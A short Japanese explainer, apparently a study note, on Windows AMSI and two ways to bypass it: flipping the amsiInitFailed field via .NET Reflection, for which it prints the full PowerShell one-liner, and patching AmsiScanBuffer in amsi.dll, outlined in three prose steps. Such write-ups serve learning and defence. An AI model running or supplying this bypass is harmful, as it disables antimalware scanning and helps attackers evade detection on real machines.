# AMSIとは
Antimalware Scan Interfaceの略。  
Windowsに搭載された機能で、アプリケーションやスクリプトが実行される際に、インストールされているウイルス対策ソフトに連携して詳細なスキャンを可能にする仕組み。

## Step1 amsiInitFailed
amsiInitFailedとはAMSIの初期化状態を示す変数である。この値が`False`だと問題なくスキャンが走る。  
この変数を`true`にしてAMSIの初期化を失敗したように認識させてバイパスする。  
通常はセキュリティ関連のPowershell内部の変数は書き換えられないが、`.NET Reflection`を利用すると可能。  
※その時のPowershellセッションのみ可能。

## Step2 AmsiScanBuffer
`AmsiScanBuffer`は`amsi.dll`のAPIであり、メモリに展開されたプログラムを検閲する役割がある。例えば下記のコマンドを実行しようとするとブロックされる。
```powershell
PS C:\Users\user> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
発生場所 行:1 文字:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetF ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
このスクリプトには、悪質なコンテンツが含まれているため、ウイルス対策ソフトウェアによりブロックされています。
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
このコマンドは.NETリフレクションを悪用し、非公開であるシステム内部の変数にアクセスしてAmsiスキャンをスキップするように値を変更しているコマンドである。
`AmsiScanBuffer`の先頭を書き換えることによって、ブロックされないようにバイパスするテクニック。
1. 指定したプロセスのスナップショットを取得し、読み込まれているモジュールを列挙する。
2. 自分のプロセスに`amsi.dll`を読み込み、`AmsiScanBuffer`を探してアドレスを特定する。
3. 1, 2を統合し、PIDからDLLを列挙し、`AmsiScanBuffer`を探し、パッチを当てる。
